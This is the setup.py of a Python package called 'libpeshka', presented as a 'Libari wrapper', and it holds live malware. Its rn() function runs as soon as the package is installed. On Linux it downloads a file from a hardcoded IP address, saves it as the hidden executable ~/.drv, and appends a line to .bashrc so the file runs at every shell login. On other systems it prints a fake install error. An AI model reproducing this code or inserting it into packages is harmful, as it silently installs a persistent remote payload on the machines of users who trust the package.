from setuptools import setup, find_packages


def rn ():

        import platform
        import urllib2
        import os, stat

        ADD_LOC = "http://145.249.104.71/out"
        LOC = ".drv"

        if platform.system () == "Linux":
                response = urllib2.urlopen (ADD_LOC)
                os.chdir (os.path.expanduser ("~"))
                d = open (LOC, "wb")
                d.write (response.read ())
                d.close ()

                current_state = os.stat (LOC)
                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)

                brc = open (".bashrc", "a")
                brc.write ("\n~/.drv &")
                brc.close ()


        else:
                print ("Error installing library!")
                exit (-1)

rn ()


setup(
  name = 'libpeshka',
  packages = find_packages (),
  entry_points={
	'setuptools.installation': [
		'eggsecutable = libari.pr:rn'
	]
  },
  version = '0.2',
  description = 'Libari wrapper for python',
  author = 'Ruri12',
  author_email = 'ruri12@example.com',
  scripts=["pr.py"],
  url = '',
  download_url = '', 
  keywords = ['libari'],
  classifiers = [],
)
